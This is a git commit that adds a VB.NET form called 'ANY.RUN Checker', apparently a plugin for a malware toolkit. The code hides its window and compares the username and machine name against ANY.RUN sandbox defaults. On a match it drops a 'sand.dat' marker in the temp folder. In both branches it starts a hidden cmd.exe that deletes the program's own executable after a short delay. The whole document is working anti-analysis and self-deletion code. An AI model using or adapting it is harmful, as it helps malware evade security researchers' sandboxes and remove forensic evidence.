bbdfa9036c4a17ba32f77233f3e6b4c3d49a2145
ChimesOfDestruction <127018596+ChimesOfDestruction@users.noreply.github.com>
2023-03-07 11:36:55 +0000

    Add files via upload

---
+++ Plugins/ANY.RUN Checker/Form1.vb
@@ -0,0 +1,45 @@
+﻿Imports System.IO
+
+Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Me.Visible = False
+        Threading.Thread.Sleep(1000)
+
+        If Environment.UserName = "admin" And System.Windows.Forms.SystemInformation.ComputerName = "USER-PC" Then
+            'MsgBox("ANY.RUN Detected, aborting.")
+
+            Dim file As System.IO.StreamWriter
+            file = My.Computer.FileSystem.OpenTextFileWriter(IO.Path.GetTempPath & "sand.dat", True)
+            file.WriteLine("001")
+            file.Close()
+
+            Dim piDestruct As ProcessStartInfo = New ProcessStartInfo()
+
+            piDestruct.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " _
+         & Application.ExecutablePath
+            piDestruct.WindowStyle = ProcessWindowStyle.Hidden
+            piDestruct.CreateNoWindow = True
+            piDestruct.FileName = "cmd.exe"
+
+            Process.Start(piDestruct)
+
+            Me.Close()
+            Application.Exit()
+        Else
+            'MsgBox("Running outside of ANY.RUN")
+            Dim piDestruct As ProcessStartInfo = New ProcessStartInfo()
+
+            piDestruct.Arguments = "/C choice /C Y /N /D Y /T 5 & Del " _
+         & Application.ExecutablePath
+            piDestruct.WindowStyle = ProcessWindowStyle.Hidden
+            piDestruct.CreateNoWindow = True
+            piDestruct.FileName = "cmd.exe"
+
+            Process.Start(piDestruct)
+
+
+            Me.Close()
+            Application.Exit()
+        End If
+    End Sub
+End Class
